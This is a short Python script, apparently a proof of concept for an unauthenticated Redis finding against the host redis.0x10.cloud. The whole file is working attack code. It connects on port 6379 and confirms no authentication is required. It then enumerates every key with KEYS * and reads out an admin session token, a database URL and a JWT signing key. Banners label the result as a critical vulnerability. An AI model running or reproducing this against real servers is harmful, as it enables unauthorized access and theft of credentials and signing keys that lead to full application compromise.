import socket
import time

TARGET = "redis.0x10.cloud"
PORT = 6379

def redis_cmd(sock, command):
    sock.send(command.encode() + b"\r\n")
    time.sleep(0.15)
    return sock.recv(4096).decode(errors="ignore")

def parse_bulk_string(response):
    lines = response.strip().split("\r\n")
    if len(lines) >= 2:
        return lines[1]
    return response.strip()

print("=" * 55)
print("  Vulnerability: Unauthenticated Redis Access")
print(f"  Target: {TARGET}:{PORT}")
print("=" * 55)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5)

try:
    sock.connect((TARGET, PORT))
    print(f"\n[+] Connected to {TARGET}:{PORT}\n")

    # Confirm no auth required
    pong = redis_cmd(sock, "PING")
    if "+PONG" in pong:
        print("[!] VULNERABILITY FOUND")
        print("    Redis is accessible with NO authentication.")
        print("    Any attacker can read, write, or delete all data.\n")

    # Enumerate keys
    keys_raw = redis_cmd(sock, "KEYS *")
    keys = [line for line in keys_raw.strip().split("\r\n") if not line.startswith(("*", "$", "+", "-"))]
    print(f"[+] Keys found in database ({len(keys)}):")
    for k in keys:
        print(f"    - {k}")

    print()

    # Dump sensitive keys
    sensitive = ["session:admin:token", "config:database_url", "secret:jwt_key"]
    for key in sensitive:
        response = redis_cmd(sock, f"GET {key}")
        value = parse_bulk_string(response)
        print(f"[+] {key}:")
        print(f"    {value}\n")

except Exception as e:
    print(f"[ERROR] {e}")
finally:
    sock.close()

print("=" * 55)
print("  Risk: CRITICAL")
print("  An unauthenticated attacker can read admin session")
print("  tokens, database credentials, and signing keys —")
print("  enabling full application compromise.")
print("=" * 55)
